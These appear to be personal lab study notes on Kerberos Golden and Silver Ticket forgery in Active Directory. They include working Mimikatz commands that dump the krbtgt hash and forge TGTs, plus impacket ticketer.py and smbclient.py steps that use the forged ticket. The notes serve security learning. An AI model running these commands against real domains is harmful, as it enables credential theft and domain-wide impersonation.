
**Type:** Kerberos Ticket Forgery  
**Tool:** Mimikatz  
**Goal:** Forge Kerberos tickets to impersonate privileged accounts or access specific services.

Golden and Silver Tickets are Kerberos ticket-forging attacks.

- **Golden Ticket:** Forge a **TGT** using the `krbtgt` account's secret.
- **Silver Ticket:** Forge a **service ticket (TGS)** using the target service account's secret.
    
- Golden Tickets have broader scope because a forged TGT can be used to request tickets for different Kerberos services.

- Silver Tickets are generally limited to the targeted service.

---

# Kerberos Concepts

## KRBTGT

`krbtgt` is a special Active Directory account associated with the **Key Distribution Center (KDC)**.

Its secret is used by the KDC to protect **Ticket Granting Tickets (TGTs)**.

If an attacker obtains the `krbtgt` NTLM hash, they can potentially forge TGTs.

---

## TGT

A **Ticket Granting Ticket (TGT)** proves a user's identity to the KDC and allows the user to request service tickets.

```text
User → KDC
      ↓
     TGT
      ↓
Request service tickets
```

A TGT is **not a ticket to one specific service**.

---

## TGS / Service Ticket

A **service ticket (TGS)** is issued for a specific Kerberos service.

Example:

```text
SQLService
HTTP
CIFS
LDAP
```

The client presents the appropriate service ticket when accessing that service.

---

# Golden Ticket

A Golden Ticket attack abuses the `krbtgt` account's secret to forge a TGT.

### Requirements

Typically:
- `krbtgt` NTLM hash/AES key
- Domain SID
- Target username
- Domain name
- Appropriate ticket parameters

The forged TGT can then be used to request service tickets for Kerberos services in the domain.

### Why it is powerful

```text
krbtgt secret
      ↓
Forge TGT
      ↓
Impersonate user
      ↓
Request service tickets
      ↓
Access Kerberos services
```

A Golden Ticket therefore has much broader potential scope than a Silver Ticket.

---

# Dump the KRBTGT Hash

Run Mimikatz from an elevated command prompt:
```cmd
mimikatz.exe
```

Enable debug privilege:
```text
privilege::debug
```

Expected:
```text
Privilege '20' OK
```

Dump the `krbtgt` account information:
```text
lsadump::lsa /inject /name:krbtgt
```

This can provide information required for ticket forgery, including the account's NTLM hash.

You also need the **domain SID**.

---

# Create a Golden Ticket

Mimikatz's ticket-forging command is:

```text
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID>
```

Example structure:

```text
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /id:500
```

Important parameters:

|Option|Meaning|
|---|---|
|`/user`|Username to impersonate|
|`/domain`|AD domain|
|`/sid`|Domain SID|
|`/krbtgt`|`krbtgt` secret/hash|
|`/id`|User RID|

Mimikatz generates a forged `.kirbi` ticket.

---

# Create a Golden Ticket Remotely

### Forge TGT
```bash
ticketer.py \
-nthash <KRBTGT_HASH> \
-domain-sid <DOMAIN_SID> \
-domain thm.loc \
Administrator
```
the tool path --> /home/eyad/.local/share/pipx/venvs/impacket/bin

- `-nthash` → KRBTGT NT hash.
- `-domain-sid` → Domain SID.
- `-domain` → AD domain.
- `Administrator` → User the forged ticket represents.

Output:
```text
Administrator.ccache
```
### Use the Forged Ticket
```bash
export KRB5CCNAME=Administrator.ccache
```
Tells Kerberos tools to use the forged ticket.
### Authenticate
```bash
smbclient.py thm.loc/Administrator@SERVER1.thm.loc \
-k -no-pass -dc-ip 192.168.11.100
```
- `-k` → Kerberos authentication.
- `-no-pass` → Don't use a password.
- `-dc-ip` → Specify the DC.
- **Hostname required** → Kerberos uses SPNs/DNS.
    
**Concept:**
```text
KRBTGT Hash
     ↓
Forge TGT
     ↓
Administrator.ccache
     ↓
Kerberos Authentication
     ↓
Domain-Level Access
```

**Why This Works:** All Kerberos TGTs are encrypted and signed using the KRBTGT account's password hash. If an attacker obtains this hash, they can forge tickets that the domain controllers will accept as legitimate. The forged tickets can grant any level of access and are virtually indistinguishable from legitimate tickets.d


---

# Silver Ticket

A Silver Ticket is similar conceptually but has a much narrower scope.

Instead of compromising the `krbtgt` secret, the attacker obtains the secret of a **service account** and uses it to forge a service ticket for that service.

Example scenario:
```text
Compromised user
      ↓
Kerberoast SQLService
      ↓
Recover SQLService password/hash
      ↓
Forge SQL service ticket
      ↓
Access SQL service
```

A Silver Ticket can therefore be useful when the goal is access to one particular service rather than broad Kerberos access.

---

# Golden vs Silver Ticket

| |Golden Ticket|Silver Ticket|
|---|---|---|
|Forged ticket|TGT|Service Ticket / TGS|
|Secret required|`krbtgt`|Target service account|
|Scope|Broad|Specific service|
|Main target|Domain Kerberos authentication|Specific Kerberos service|
|Stealth|Can be noisy/powerful|Often narrower and potentially less noticeable|
|Example|Forge TGT for Administrator|Forge CIFS/SQL/HTTP service ticket|

> **Golden = forge a TGT.**  
> **Silver = forge a service ticket.**

---

# Using a Forged Ticket

Mimikatz can create a new command shell using the ticket:
```text
misc::cmd
```

The new command prompt can then be used to access resources available through the forged ticket.

For example, in an authorized lab:
```cmd
dir \\TARGET\C$
```

What you can access depends on the privileges represented by the forged ticket and the service being targeted.

---

# Important Correction

A common misconception is:
```text
KRBTGT = TGT
```

This is incorrect.

```text
krbtgt
  ↓
AD account used by the KDC

TGT
  ↓
Kerberos ticket issued to a user

TGS / Service Ticket
  ↓
Ticket for a specific Kerberos service
```

The **Golden Ticket** attack abuses the `krbtgt` account's secret to forge a TGT.

The **Silver Ticket** attack abuses a service account's secret to forge a service ticket for a particular service.

---

# Key Points

- `krbtgt` is a special AD account used by the KDC.
- A **Golden Ticket** is a forged TGT.
- A **Silver Ticket** is a forged service ticket.
- Golden Tickets require compromising the `krbtgt` secret.
- Silver Tickets require compromising the target service account's secret.
- Golden Tickets have broader potential access.
- Silver Tickets are restricted to the targeted service.
- Protecting privileged accounts and service accounts is critical.
- Restrict privileged logons and monitor abnormal Kerberos authentication.